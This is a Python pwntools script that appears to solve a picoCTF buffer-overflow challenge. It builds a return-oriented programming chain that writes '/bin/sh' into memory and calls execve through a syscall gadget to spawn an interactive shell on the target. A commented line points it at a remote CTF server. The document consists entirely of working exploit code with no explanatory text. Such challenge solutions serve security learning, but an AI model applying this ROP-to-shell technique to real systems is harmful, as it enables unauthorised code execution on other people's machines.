import pwn

pwn.context.update(arch='amd64', os='linux', encoding='utf-8')

data_addr = 0x00000000006BA360

pop_rsi_addr = 0x0048ed33
pop_rax_addr = 0x00476407
mov_rsi_rax_addr = 0x0047ff91
syscall_addr = 0x00485e95
pop_rdi_addr = 0x0049220f
pop_rdx_addr = 0x004afe92

payload = pwn.p64(pop_rsi_addr) + pwn.p64(data_addr) + pwn.p64(pop_rax_addr) + b'/bin/sh\x00' + pwn.p64(mov_rsi_rax_addr) + pwn.p64(pop_rdi_addr) + pwn.p64(data_addr) + pwn.p64(pop_rsi_addr) + pwn.p64(0) + pwn.p64(pop_rdx_addr) + pwn.p64(0) + pwn.p64(pop_rax_addr) + pwn.p64(59) + pwn.p64(syscall_addr)


res = b"84\n" + (pwn.cyclic(0x78) + payload).ljust(360, b'0') + b"\n"

with pwn.process("./vuln") as io:
#with pwn.remote("shape-facility.picoctf.net", 60522) as io:
    io.sendline(b"84")
    io.recvrepeat(0.1)
    io.sendline((pwn.cyclic(0x78) + payload).ljust(360, b'0'))
    io.interactive()